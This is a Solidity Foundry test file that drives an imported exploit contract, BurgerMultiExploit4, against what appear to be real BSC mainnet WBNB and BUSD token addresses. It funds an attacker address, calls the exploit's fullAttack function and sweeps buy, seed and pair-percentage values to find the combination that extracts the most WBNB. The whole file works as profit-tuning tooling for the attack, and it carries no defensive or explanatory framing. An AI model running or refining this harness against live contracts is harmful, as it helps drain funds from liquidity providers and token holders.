// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "./BurgerMultiTest4.t.sol";

contract BurgerMultiTest7 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    function _tryAttack(uint256 buyAmt, uint256 seedAmt, uint256 pairPct) internal returns (int256) {
        address att = makeAddr(string(abi.encodePacked("a", buyAmt, seedAmt, pairPct)));
        vm.deal(att, 3000 ether);
        vm.startPrank(att);

        BurgerMultiExploit4 e = new BurgerMultiExploit4();
        IWBNB(WBNB).deposit{value: 2000 ether}();
        IWBNB(WBNB).transfer(address(e), 2000 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(e));

        try e.fullAttack(BUSD, buyAmt, seedAmt, pairPct) {
            uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(e));
            vm.stopPrank();
            return int256(wbnbAfter) - int256(wbnbBefore);
        } catch {
            vm.stopPrank();
            return type(int256).min;
        }
    }

    function test_sweep_around_best() public {
        int256 bestDelta = type(int256).min;
        uint256 bestBuy;
        uint256 bestSeed;
        uint256 bestPct;

        uint256[6] memory buys = [uint256(400 ether), 500 ether, 600 ether, 700 ether, 800 ether, 1000 ether];
        uint256[4] memory seeds = [uint256(30 ether), 50 ether, 70 ether, 100 ether];
        uint256[5] memory pcts = [uint256(30), 40, 50, 60, 70];

        for (uint b = 0; b < buys.length; b++) {
            for (uint s = 0; s < seeds.length; s++) {
                for (uint p = 0; p < pcts.length; p++) {
                    int256 delta = _tryAttack(buys[b], seeds[s], pcts[p]);
                    if (delta > bestDelta) {
                        bestDelta = delta;
                        bestBuy = buys[b];
                        bestSeed = seeds[s];
                        bestPct = pcts[p];
                    }
                }
            }
        }

        emit log_named_uint("bestBuy (ether)", bestBuy / 1 ether);
        emit log_named_uint("bestSeed (ether)", bestSeed / 1 ether);
        emit log_named_uint("bestPct", bestPct);
        emit log_named_int("bestDelta", bestDelta);
    }
}
